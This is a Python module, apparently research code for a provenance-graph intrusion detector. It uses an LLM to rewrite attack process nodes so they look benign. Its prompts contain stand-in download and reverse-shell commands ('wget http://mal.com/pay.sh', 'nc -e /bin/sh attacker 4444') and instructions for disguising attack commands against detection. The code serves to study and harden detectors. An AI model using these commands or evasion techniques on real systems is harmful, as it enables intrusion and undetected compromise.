"""
语义变异 (Semantic Mutation) — 论文 Figure 5

对结构变异后注入的攻击节点，使用 LLM 修改其 properties 使其融入良性上下文。
三种策略：
- Replacement: 命令名在良性语料中，参数不在 → 替换参数
- Rewriting: 命令名和参数都在良性语料中 → 重写整个命令
- Extension: 命令名和参数都不在良性语料中 → 前后追加良性操作

注意：节点特征由 properties 决定（embedder 用 properties 构建特征向量），
name 是 UUID 仅用作字典 key，语义变异必须操作 properties。
"""
from __future__ import annotations
from typing import List, Dict, Optional, Tuple, Set
import json
import os

try:
    import igraph as ig
except ImportError:
    ig = None

_SEM_LOG_COUNT = 0

def _log_semantic_mutation(g_mut, before_props, before_strategies, mutations, llm_response, model_name="unknown"):
    """记录每次语义变异的完整信息：策略、变异前后、LLM 原始输出"""
    global _SEM_LOG_COUNT
    _SEM_LOG_COUNT += 1
    safe_name = model_name.replace("/", "_")
    log_file = f"semantic_mutation_log_{safe_name}.txt"

    with open(log_file, "a") as f:
        f.write(f"\n{'='*60}\n")
        f.write(f"调用 #{_SEM_LOG_COUNT}\n")
        f.write(f"{'='*60}\n")

        # 每个节点的变异前后对比
        for idx, prop_before in before_props.items():
            strategy, atk_parts, ben_parts = before_strategies.get(idx, ("?","",""))
            prop_after = _get_properties(g_mut, idx) if idx < g_mut.vcount() else "?"
            changed = "✓ CHANGED" if prop_before != prop_after else "  unchanged"
            f.write(f"\n  Node idx={idx} strategy={strategy} {changed}\n")
            if atk_parts:
                f.write(f"    ATTACK_PARTS: {atk_parts}\n")
            if ben_parts:
                f.write(f"    BENIGN_PARTS: {ben_parts}\n")
            f.write(f"    BEFORE: {prop_before}\n")
            f.write(f"    AFTER:  {prop_after}\n")

        # LLM 原始输出
        f.write(f"\n  LLM parsed mutations: {len(mutations)}\n")
        for m in mutations:
            f.write(f"    {m}\n")
        f.write(f"\n  LLM raw response:\n{llm_response}\n")


def _clean_set_str(prop: str) -> str:
    """将 str(set(...)) 格式的 properties 清理为单条字符串。

    properties 存储为 str(set(...))，如 "{'bash -c wget,12345,/bin/bash', 'other'}"
    取第一个元素（通常是最主要的属性描述）。
    """
    s = prop.strip()
    if not s or s in ("set()", "{}"):
        return ""
    # 去掉 set 的花括号
    if s.startswith("{") and s.endswith("}"):
        s = s[1:-1].strip()
    # 按引号拆分取第一个元素（set 元素被引号包裹，逗号分隔）
    if s.startswith("'") or s.startswith('"'):
        quote = s[0]
        end = s.find(quote, 1)
        if end > 0:
            return s[1:end]
    # fallback: 没引号的情况
    return s


def _get_properties(g, v_idx: int) -> str:
    """获取节点的 properties 字符串（已清理 set 格式）"""
    try:
        raw = str(g.vs[v_idx]['properties'])
    except Exception:
        raw = str(g.vs[v_idx].attributes().get('properties', ''))
    return _clean_set_str(raw)


def _parse_process_properties(prop: str) -> Tuple[str, str, str]:
    """解析进程节点的 properties: 'cmdLine,tgid,path' → (cmdLine, tgid, path)

    prop 应已经过 _clean_set_str 清理。
    """
    parts = prop.split(',', 2)  # 最多拆 3 段
    cmd = parts[0].strip() if len(parts) > 0 else ""
    tgid = parts[1].strip() if len(parts) > 1 else ""
    path = parts[2].strip() if len(parts) > 2 else ""
    return cmd, tgid, path


def _parse_network_properties(prop: str) -> Tuple[str, str, str, str]:
    """解析网络节点的 properties: 'srcaddr,srcport,dstaddr,dstport'"""
    parts = prop.split(',')
    srcaddr = parts[0].strip() if len(parts) > 0 else ""
    srcport = parts[1].strip() if len(parts) > 1 else ""
    dstaddr = parts[2].strip() if len(parts) > 2 else ""
    dstport = parts[3].strip() if len(parts) > 3 else ""
    return srcaddr, srcport, dstaddr, dstport


def _collect_benign_corpus(benign_graphs: list) -> Tuple[Set[str], Set[str], Set[str]]:
    """
    从历史良性图中收集属性白名单 H_b（基于 properties 字段）。

    Returns:
        (benign_commands, benign_args, benign_files):
        - benign_commands: 出现过的进程命令名集合（从 properties 的 cmdLine 提取）
        - benign_args: 出现过的命令行参数集合
        - benign_files: 出现过的文件路径集合
    """
    commands = set()
    args = set()
    files = set()

    for g, _ in benign_graphs:
        for v in range(g.vcount()):
            vtype = str(g.vs[v].attributes().get("type", "")).lower()
            prop = _get_properties(g, v)

            if "process" in vtype or "subject" in vtype:
                # 进程节点：从 properties 解析 cmdLine
                cmd_line, _tgid, _path = _parse_process_properties(prop)
                cmd_parts = cmd_line.split()
                if cmd_parts:
                    commands.add(cmd_parts[0])
                    for p in cmd_parts[1:]:
                        args.add(p)
            elif "file" in vtype:
                # 文件节点：properties 就是文件路径
                if prop and prop != "set()":
                    files.add(prop)

    return commands, args, files


def _assign_strategy(
    prop: str,
    vtype: str,
    benign_commands: Set[str],
    benign_args: Set[str],
) -> str:
    """
    为节点分配变异策略（基于 properties）。

    - Replacement: 命令名在 H_b，参数不在 → 保留命令，替换参数
    - Rewriting: 命令名和参数都在 H_b → 重写整个命令
    - Extension: 命令名和参数都不在 H_b → 追加良性操作
    """
    if "process" in vtype or "subject" in vtype:
        cmd_line, _tgid, _path = _parse_process_properties(prop)
        parts = cmd_line.split()
        if not parts:
            return "extension"

        cmd = parts[0]
        node_args = set(parts[1:]) if len(parts) > 1 else set()

        cmd_in_benign = cmd in benign_commands
        args_in_benign = bool(node_args) and node_args.issubset(benign_args)

        if cmd_in_benign and not args_in_benign:
            return "replacement"
        elif cmd_in_benign and args_in_benign:
            return "rewriting"
        else:
            return "extension"
    else:
        # 文件/网络节点统一用 replacement
        return "replacement"


def _build_context_triples(g, node_idx: int, r_hop: int = 2) -> List[str]:
    """
    提取节点的 r-hop 边界上下文，编码为因果三元组序列。
    格式: <entity_type:properties_summary, operation_type, entity_type:properties_summary>
    """
    triples = []
    visited = {node_idx}
    frontier = {node_idx}

    for _ in range(r_hop):
        next_frontier = set()
        for v in frontier:
            for e_idx in g.incident(v, mode="all"):
                e = g.es[e_idx]
                src, dst = e.source, e.target
                neighbor = dst if src == v else src
                if neighbor in visited:
                    continue
                next_frontier.add(neighbor)
                visited.add(neighbor)

                # 构建三元组（用 properties 摘要代替 name/UUID）
                action = str(e.attributes().get("actions", "UNK"))
                src_type = str(g.vs[src].attributes().get("type", "UNK"))
                src_prop = _get_properties(g, src)[:48]
                dst_type = str(g.vs[dst].attributes().get("type", "UNK"))
                dst_prop = _get_properties(g, dst)[:48]

                triple = f"<{src_type}:{src_prop}, {action}, {dst_type}:{dst_prop}>"
                triples.append(triple)
        frontier = next_frontier

    return triples


def build_semantic_mutation_prompt(
    nodes_info: List[Dict],
    context_triples: List[List[str]],
) -> str:
    """
    构建语义变异的 LLM prompt（论文 Figure 5）。

    为每个节点标注哪些部分是攻击特有的（不在良性语料 H_b 中，必须保留），
    哪些是良性的（在 H_b 中，可以替换），让 LLM 做精准变异。
    """

    prompt_parts = [
        "You are creating stealthy attack variants in a provenance graph. "
        "Properties format: cmdLine,tgid,path (3 comma-separated fields).\n\n"
        "## Key principle\n"
        "Each node has ATTACK-SPECIFIC parts and BENIGN parts, determined by historical benign data H_b.\n"
        "- ATTACK-SPECIFIC (not in H_b): MUST be preserved — this is the attack semantics.\n"
        "- BENIGN (in H_b): can be replaced with other benign values to disguise the attack.\n\n"
        "## Strategies\n"
        "- replacement: command name is benign (in H_b), args are attack-specific (not in H_b).\n"
        "  → Keep the attack args, replace the command name with a different benign command.\n"
        "  Example: wget http://mal.com/pay.sh,1234,/usr/bin/wget\n"
        "  KEEP: http://mal.com/pay.sh  REPLACE: wget\n"
        "  → curl -H \"X-Health-Check: true\" http://mal.com/pay.sh,1234,/usr/bin/curl\n\n"
        "- rewriting: both command and args are benign (in H_b).\n"
        "  → Rewrite the entire cmdLine to fit the surrounding context.\n"
        "  Example: python /tmp/script.py,5678,/usr/bin/python\n"
        "  → php /var/www/cgi-bin/handler.php,5678,/usr/bin/php\n\n"
        "- extension: both command and args are attack-specific (not in H_b).\n"
        "  → Keep the ENTIRE command unchanged, prepend/append benign operations.\n"
        "  Example: nc -e /bin/sh attacker 4444,9999,/usr/bin/nc\n"
        "  KEEP ALL. Wrap it:\n"
        "  → systemctl status nginx && nc -e /bin/sh attacker 4444,9999,/usr/bin/nc\n\n"
    ]

    prompt_parts.append(f"## Nodes to mutate ({len(nodes_info)})\n\n")

    for i, info in enumerate(nodes_info):
        ctx_list = context_triples[i][:10] if i < len(context_triples) else []
        ctx = "; ".join(ctx_list) if ctx_list else "N/A"
        atk = info.get("attack_parts", "")
        ben = info.get("benign_parts", "")
        prompt_parts.append(
            f"Node {i+1}:\n"
            f"  properties: {info['properties']}\n"
            f"  strategy: {info['strategy']}\n"
        )
        if atk:
            prompt_parts.append(f"  ATTACK-SPECIFIC (must keep): {atk}\n")
        if ben:
            prompt_parts.append(f"  BENIGN (can replace): {ben}\n")
        # 关联的文件/网络节点（带真实图索引）
        assoc = info.get("associated_nodes", [])
        if assoc:
            prompt_parts.append(f"  associated file/network nodes (use these exact ids in associated_updates):\n")
            for a in assoc:
                prompt_parts.append(f"    {a}\n")
        prompt_parts.append(f"  context: {ctx}\n\n")

    prompt_parts.append(
        "## Output\n"
        "Return ONLY a JSON array:\n"
        '[{"node_id": 1, "new_properties": "cmdLine,tgid,path", '
        '"associated_updates": [{"node_id": <exact_graph_id>, "new_properties": "..."}]}]\n\n'
        "Rules:\n"
        "1. Process node: cmdLine,tgid,path (exactly 3 fields, keep tgid unchanged)\n"
        "2. ATTACK-SPECIFIC parts MUST appear in new_properties\n"
        "3. Only replace BENIGN parts with other benign values\n"
        "4. associated_updates: use the EXACT graph ids listed above for each associated node. "
        "Update file paths and network addresses to match the mutated process semantics\n"
        "5. Do NOT include metadata (strategy, context, etc.) in new_properties\n"
    )

    return "".join(prompt_parts)


def build_multi_strategy_prompt(
    nodes_info: List[Dict],
    context_triples: List[List[str]],
) -> str:
    """
    构建三策略同时输出的 LLM prompt。
    每个攻击节点同时生成 Replacement/Rewriting/Extension 三种变异，
    供 StrategyMoE 可学习融合。
    """

    prompt_parts = [
        "You are generating diverse attack variants in a provenance graph for contrastive learning.\n"
        "Properties format: cmdLine,tgid,path (3 comma-separated fields).\n\n"
        "## Task\n"
        "For each node, generate 3 variants using ALL three strategies.\n"
        "Each variant MUST be substantially different from the others — "
        "different command structure, different token composition.\n\n"
        "## Strategies\n"
        "A. replacement: The command name is benign (in H_b), args are attack-specific.\n"
        "   → Keep the attack args unchanged. Replace the command name AND restructure "
        "the surrounding command syntax (add flags, change invocation style, alter path format).\n"
        "   BAD: /bin/sh → /bin/bash (only 1 token change)\n"
        "   GOOD: /bin/sh -c ./gtcache &>/dev/null & → "
        "env LANG=C /usr/bin/perl -e 'exec(\"./gtcache\")' &>/dev/null &\n\n"
        "B. rewriting: Rewrite the entire cmdLine into a functionally equivalent but "
        "syntactically different command. Change the execution method, shell syntax, "
        "and path structure while preserving the attack semantics.\n"
        "   GOOD: /bin/sh -c ./gtcache &>/dev/null & → "
        "nohup /usr/lib/update-notifier/package-data-helper ./gtcache >/dev/null 2>&1 &\n\n"
        "C. extension: Keep the ENTIRE original command unchanged. "
        "Wrap it in a realistic multi-step shell pipeline with ≥3 additional commands.\n"
        "   BAD: systemctl status nginx && <original> (only 1 prefix)\n"
        "   GOOD: cd /var/log && find . -name '*.tmp' -mtime +7 -delete; "
        "logger -t maintenance 'cleanup done'; <original>\n\n"
    ]

    prompt_parts.append(f"## Nodes to mutate ({len(nodes_info)})\n\n")

    for i, info in enumerate(nodes_info):
        ctx_list = context_triples[i][:10] if i < len(context_triples) else []
        ctx = "; ".join(ctx_list) if ctx_list else "N/A"
        atk = info.get("attack_parts", "")
        ben = info.get("benign_parts", "")
        prompt_parts.append(
            f"Node {i+1}:\n"
            f"  properties: {info['properties']}\n"
        )
        if atk:
            prompt_parts.append(f"  ATTACK-SPECIFIC (must keep in all 3 variants): {atk}\n")
        if ben:
            prompt_parts.append(f"  BENIGN (can replace): {ben}\n")
        assoc = info.get("associated_nodes", [])
        if assoc:
            prompt_parts.append(f"  associated nodes:\n")
            for a in assoc:
                prompt_parts.append(f"    {a}\n")
        prompt_parts.append(f"  context: {ctx}\n\n")

    prompt_parts.append(
        "## Output\n"
        "Return ONLY a JSON array. Each entry has all 3 variants:\n"
        '[{"node_id": 1,\n'
        '  "replacement": "cmdLine,tgid,path",\n'
        '  "rewriting": "cmdLine,tgid,path",\n'
        '  "extension": "cmdLine,tgid,path"}]\n\n'
        "Rules:\n"
        "1. Exactly 3 comma-separated fields per variant: cmdLine,tgid,path. Keep tgid unchanged.\n"
        "2. ATTACK-SPECIFIC parts MUST appear in ALL 3 variants.\n"
        "3. The 3 variants must have substantially different token sequences "
        "(not just swapping one command name).\n"
    )

    return "".join(prompt_parts)


def generate_strategy_variants(
    g_mut,
    attack_node_indices: List[int],
    benign_commands: Set[str],
    benign_args: Set[str],
    llm_fn=None,
    r_hop: int = 2,
    model_name: str = "unknown",
) -> Dict[int, Dict[str, str]]:
    """
    为每个攻击进程节点生成 3 种策略的变异 properties，不修改图。

    Returns:
        {node_idx: {
            "original": 原始 properties,
            "replacement": replacement 变异,
            "rewriting": rewriting 变异,
            "extension": extension 变异,
        }}
    """
    if not attack_node_indices or llm_fn is None:
        return {}

    # 收集攻击进程节点信息
    proc_nodes = []
    for idx in attack_node_indices:
        if idx >= g_mut.vcount():
            continue
        vtype = str(g_mut.vs[idx].attributes().get("type", "")).lower()
        if "process" not in vtype and "subject" not in vtype:
            continue
        prop = _get_properties(g_mut, idx)
        cmd_line, _tgid, _path = _parse_process_properties(prop)
        parts = cmd_line.split()
        attack_parts, benign_parts_str = "", ""
        if parts:
            cmd = parts[0]
            node_args = " ".join(parts[1:]) if len(parts) > 1 else ""
            cmd_in = cmd in benign_commands
            args_in = bool(node_args) and set(parts[1:]).issubset(benign_args)
            if not cmd_in:
                attack_parts = cmd + (" " + node_args if node_args else "")
            elif not args_in and node_args:
                attack_parts = node_args
            if cmd_in:
                benign_parts_str = cmd
            if args_in and node_args:
                benign_parts_str += (" " + node_args if benign_parts_str else node_args)
        proc_nodes.append({
            "idx": idx, "properties": prop,
            "attack_parts": attack_parts, "benign_parts": benign_parts_str,
        })

    if not proc_nodes:
        return {}

    # 构建 prompt
    nodes_info = []
    context_triples = []
    for pn in proc_nodes:
        ctx = _build_context_triples(g_mut, pn["idx"], r_hop=r_hop)
        context_triples.append(ctx)
        associated = []
        for nb in g_mut.neighbors(pn["idx"], mode="all"):
            nb_type = str(g_mut.vs[nb].attributes().get("type", "")).lower()
            nb_prop = _get_properties(g_mut, nb)
            if "file" in nb_type or "net" in nb_type or "flow" in nb_type:
                associated.append(f"id={nb} type={nb_type} properties={nb_prop[:50]}")
        nodes_info.append({
            "node_id": pn["idx"],
            "properties": pn["properties"],
            "associated_nodes": associated[:5],
            "attack_parts": pn["attack_parts"],
            "benign_parts": pn["benign_parts"],
        })

    prompt = build_multi_strategy_prompt(nodes_info, context_triples)

    # 调用 LLM
    result = {}
    try:
        response = llm_fn(prompt)
        mutations = _parse_llm_response(response)

        # 构建 node_id → proc_node 映射（同 _apply_mutations 的逻辑）
        idx_map = {pn["idx"]: pn for pn in proc_nodes}
        seq_map = {i + 1: pn for i, pn in enumerate(proc_nodes)}

        for mut in mutations:
            raw_id = mut.get("node_id")
            try:
                node_id = int(raw_id)
            except (ValueError, TypeError):
                continue
            target = idx_map.get(node_id) or seq_map.get(node_id)
            if target is None:
                continue
            actual_idx = target["idx"]
            result[actual_idx] = {
                "original": target["properties"],
                "replacement": mut.get("replacement", target["properties"]),
                "rewriting": mut.get("rewriting", target["properties"]),
                "extension": mut.get("extension", target["properties"]),
            }

        # 没被 LLM 覆盖的节点，用原始 properties 填充
        for pn in proc_nodes:
            if pn["idx"] not in result:
                result[pn["idx"]] = {
                    "original": pn["properties"],
                    "replacement": pn["properties"],
                    "rewriting": pn["properties"],
                    "extension": pn["properties"],
                }

        # 日志
        _log_multi_strategy(result, response, model_name)
    except Exception as ex:
        print(f"[MultiStrategy] LLM 调用失败: {ex}")
        # 失败时用原始 properties 填充
        for pn in proc_nodes:
            result[pn["idx"]] = {
                "original": pn["properties"],
                "replacement": pn["properties"],
                "rewriting": pn["properties"],
                "extension": pn["properties"],
            }

    return result


def _log_multi_strategy(variants: Dict[int, Dict[str, str]], llm_response: str, model_name: str):
    """记录三策略变异日志，文件名带时间戳避免追加混淆"""
    global _SEM_LOG_COUNT
    _SEM_LOG_COUNT += 1
    safe_name = model_name.replace("/", "_")
    # 首次调用时生成带时间戳的文件名并缓存
    if not hasattr(_log_multi_strategy, '_log_path') or _SEM_LOG_COUNT == 1:
        import datetime
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        _log_multi_strategy._log_path = f"multi_strategy_log_{safe_name}_{ts}.txt"
    log_file = _log_multi_strategy._log_path

    with open(log_file, "a") as f:
        f.write(f"\n{'='*60}\n")
        f.write(f"调用 #{_SEM_LOG_COUNT}\n")
        f.write(f"{'='*60}\n")
        for idx, v in variants.items():
            f.write(f"\n  Node idx={idx}\n")
            f.write(f"    original:    {v['original']}\n")
            f.write(f"    replacement: {v['replacement']}\n")
            f.write(f"    rewriting:   {v['rewriting']}\n")
            f.write(f"    extension:   {v['extension']}\n")
        f.write(f"\n  LLM raw response:\n{llm_response}\n")


def apply_semantic_mutation_llm(
    g_mut,
    attack_node_indices: List[int],
    benign_commands: Set[str],
    benign_args: Set[str],
    llm_fn=None,
    r_hop: int = 2,
    model_name: str = "unknown",
) -> Optional:
    """
    对变异图中的攻击节点执行语义变异（修改 properties）。

    Args:
        g_mut: 结构变异后的图（将被修改）
        attack_node_indices: 攻击节点在 g_mut 中的索引
        benign_commands: 良性命令集合
        benign_args: 良性参数集合
        llm_fn: LLM 调用函数 (prompt: str) -> str，若为 None 则使用规则变异
        r_hop: 上下文提取半径

    Returns:
        修改后的图，或 None（失败时）
    """
    if not attack_node_indices:
        return g_mut

    # 收集需要变异的节点信息
    target_nodes = []
    for idx in attack_node_indices:
        if idx >= g_mut.vcount():
            continue
        vtype = str(g_mut.vs[idx].attributes().get("type", "")).lower()
        prop = _get_properties(g_mut, idx)
        strategy = _assign_strategy(prop, vtype, benign_commands, benign_args)

        if "process" in vtype or "subject" in vtype:
            node_type = "process"
        elif "file" in vtype:
            node_type = "file"
        elif "net" in vtype or "flow" in vtype or "sock" in vtype:
            node_type = "network"
        else:
            continue

        # 解析 H_b 判断细节：哪些在良性语料中、哪些不在
        attack_parts = ""
        benign_parts = ""
        if node_type == "process":
            cmd_line, _tgid, _path = _parse_process_properties(prop)
            parts = cmd_line.split()
            if parts:
                cmd = parts[0]
                node_args = " ".join(parts[1:]) if len(parts) > 1 else ""
                cmd_in = cmd in benign_commands
                args_in = bool(node_args) and set(parts[1:]).issubset(benign_args)
                # 不在 H_b 中的 = 攻击特有的，必须保留
                if not cmd_in:
                    attack_parts = cmd + (" " + node_args if node_args else "")
                elif not args_in and node_args:
                    attack_parts = node_args
                # 在 H_b 中的 = 良性的，可以替换
                if cmd_in:
                    benign_parts = cmd
                if args_in and node_args:
                    benign_parts += (" " + node_args if benign_parts else node_args)

        target_nodes.append({
            "idx": idx,
            "properties": prop,
            "strategy": strategy,
            "node_type": node_type,
            "attack_parts": attack_parts,
            "benign_parts": benign_parts,
        })

    if not target_nodes:
        return g_mut

    # 分离进程节点和文件/网络节点：LLM 只变异进程节点，文件/网络用规则
    proc_only = [n for n in target_nodes if n["node_type"] == "process"]
    non_proc = [n for n in target_nodes if n["node_type"] != "process"]

    # 文件/网络节点始终用规则变异
    if non_proc:
        _apply_rule_based_mutation(g_mut, non_proc, benign_commands, benign_args)

    if llm_fn is not None and proc_only:
        # LLM 语义变异（仅进程节点）
        nodes_info = []
        context_triples = []
        for pn in proc_only:
            ctx = _build_context_triples(g_mut, pn["idx"], r_hop=r_hop)
            context_triples.append(ctx)
            associated = []
            for nb in g_mut.neighbors(pn["idx"], mode="all"):
                nb_type = str(g_mut.vs[nb].attributes().get("type", "")).lower()
                nb_prop = _get_properties(g_mut, nb)
                if "file" in nb_type or "net" in nb_type or "flow" in nb_type:
                    associated.append(f"id={nb} type={nb_type} properties={nb_prop[:50]}")
            nodes_info.append({
                "node_id": pn["idx"],
                "properties": pn["properties"],
                "associated_nodes": associated[:5],
                "strategy": pn["strategy"],
                "node_type": pn["node_type"],
                "attack_parts": pn.get("attack_parts", ""),
                "benign_parts": pn.get("benign_parts", ""),
            })

        prompt = build_semantic_mutation_prompt(nodes_info, context_triples)

        try:
            # 记录变异前
            before_props = {pn["idx"]: pn["properties"] for pn in proc_only}
            before_strategies = {pn["idx"]: (pn["strategy"], pn.get("attack_parts",""), pn.get("benign_parts","")) for pn in proc_only}

            response = llm_fn(prompt)
            mutations = _parse_llm_response(response)
            _apply_mutations(g_mut, mutations, proc_only)

            # 记录变异后，写日志
            _log_semantic_mutation(g_mut, before_props, before_strategies, mutations, response, model_name=model_name)
        except Exception as ex:
            print(f"[SemMut] LLM 变异失败: {ex}")
    elif proc_only:
        # 无 LLM 时不做语义变异（规则 fallback 是噪声，不如保留原始攻击 properties）
        pass

    return g_mut


def _parse_llm_response(response: str) -> List[Dict]:
    """解析 LLM 返回的 JSON 变异结果（含容错）"""
    try:
        text = response.strip()
        if "```json" in text:
            text = text.split("```json")[1].split("```")[0].strip()
        elif "```" in text:
            text = text.split("```")[1].split("```")[0].strip()

        # 尝试直接解析
        try:
            result = json.loads(text)
            if isinstance(result, list):
                return result
        except json.JSONDecodeError:
            pass

        # 容错：修复 JSON 数组中对象之间缺少逗号的情况
        import re
        text = re.sub(r'\}\s*\{', '},{', text)
        # 容错：多个独立 JSON 数组拼接
        text = re.sub(r'\]\s*\[', ',', text)

        result = json.loads(text)
        if isinstance(result, list):
            return result
        return []
    except Exception:
        return []


def _apply_mutations(g_mut, mutations: List[Dict], process_nodes: List[Dict]):
    """将 LLM 输出的变异应用到图的 properties 上。

    LLM 返回的 node_id 可能是：
    - prompt 中的序号（1-based: Node 1, Node 2, ...）
    - 实际图节点索引
    两种都尝试匹配。
    """
    # 按实际图索引映射
    idx_map = {pn["idx"]: pn for pn in process_nodes}
    # 按 prompt 序号映射（1-based）
    seq_map = {i + 1: pn for i, pn in enumerate(process_nodes)}

    for mut in mutations:
        raw_id = mut.get("node_id")
        new_props = mut.get("new_properties", "")
        if raw_id is None or not new_props:
            continue

        # node_id 可能是字符串或整数，统一转 int
        try:
            node_id = int(raw_id)
        except (ValueError, TypeError):
            continue

        # 优先按实际索引匹配，再按 prompt 序号匹配
        target = idx_map.get(node_id) or seq_map.get(node_id)
        if target is None:
            continue

        actual_idx = target["idx"]
        if actual_idx < g_mut.vcount():
            g_mut.vs[actual_idx]["properties"] = str(new_props)

        # 关联节点更新（prompt 中已给出真实图索引，LLM 直接返回）
        for update in mut.get("associated_updates", []):
            if isinstance(update, dict):
                try:
                    assoc_id = int(update.get("node_id", -1))
                except (ValueError, TypeError):
                    continue
                assoc_props = update.get("new_properties", "")
                if assoc_props and 0 <= assoc_id < g_mut.vcount():
                    g_mut.vs[assoc_id]["properties"] = str(assoc_props)


def _apply_rule_based_mutation(
    g_mut,
    target_nodes: List[Dict],
    benign_commands: Set[str],
    benign_args: Set[str],
):
    """
    规则变异（无 LLM 时的 fallback）：
    根据策略和节点类型修改 properties
    """
    benign_cmd_list = list(benign_commands) if benign_commands else ["bash"]
    benign_arg_list = list(benign_args) if benign_args else ["-l", "--help"]

    import random as _rng

    # 收集良性文件路径（从图中非攻击文件节点的 properties）
    benign_file_list = []
    for v in range(g_mut.vcount()):
        vtype = str(g_mut.vs[v].attributes().get("type", "")).lower()
        if "file" in vtype and g_mut.vs[v].attributes().get("label", 0) != 1:
            fp = _get_properties(g_mut, v)
            if fp and fp != "set()":
                benign_file_list.append(fp)
    if not benign_file_list:
        benign_file_list = ["/tmp/data.log", "/var/log/syslog", "/etc/hosts"]

    for tn in target_nodes:
        idx = tn["idx"]
        prop = tn["properties"]
        strategy = tn["strategy"]
        node_type = tn["node_type"]

        if idx >= g_mut.vcount():
            continue

        # 文件节点：替换 properties 为良性文件路径
        if node_type == "file":
            g_mut.vs[idx]["properties"] = _rng.choice(benign_file_list)
            continue

        # 网络节点：替换 properties 为良性 IP/端口
        if node_type == "network":
            octets = [str(_rng.randint(10, 200)) for _ in range(4)]
            port = _rng.choice([80, 443, 8080, 22, 53, 8443])
            # 保持 properties 格式: srcaddr,srcport,dstaddr,dstport
            src_ip = ".".join(octets[:4])
            dst_ip = ".".join([str(_rng.randint(10, 200)) for _ in range(4)])
            g_mut.vs[idx]["properties"] = f"{src_ip},{_rng.choice([1024,2048,4096,8080])},{dst_ip},{port}"
            continue

        # 进程节点：按策略变异 properties 中的 cmdLine 部分
        cmd_line, tgid, path = _parse_process_properties(prop)
        cmd_parts = cmd_line.split()

        if strategy == "replacement" and len(cmd_parts) > 1:
            # 保留命令名，替换参数
            cmd = cmd_parts[0]
            n_args = min(len(cmd_parts) - 1, 3)
            new_args = _rng.sample(benign_arg_list, min(n_args, len(benign_arg_list)))
            new_cmd_line = f"{cmd} {' '.join(new_args)}"
        elif strategy == "rewriting":
            # 整个命令重写
            new_cmd = _rng.choice(benign_cmd_list) if benign_cmd_list else "ls"
            n_args = _rng.randint(0, 2)
            new_args = _rng.sample(benign_arg_list, min(n_args, len(benign_arg_list)))
            new_cmd_line = f"{new_cmd} {' '.join(new_args)}".strip()
        else:  # extension
            prefix_cmd = _rng.choice(benign_cmd_list) if benign_cmd_list else "echo"
            new_cmd_line = f"{prefix_cmd} && {cmd_line}"

        # 重组 properties：保留 tgid 和 path，替换 cmdLine
        g_mut.vs[idx]["properties"] = f"{new_cmd_line},{tgid},{path}"
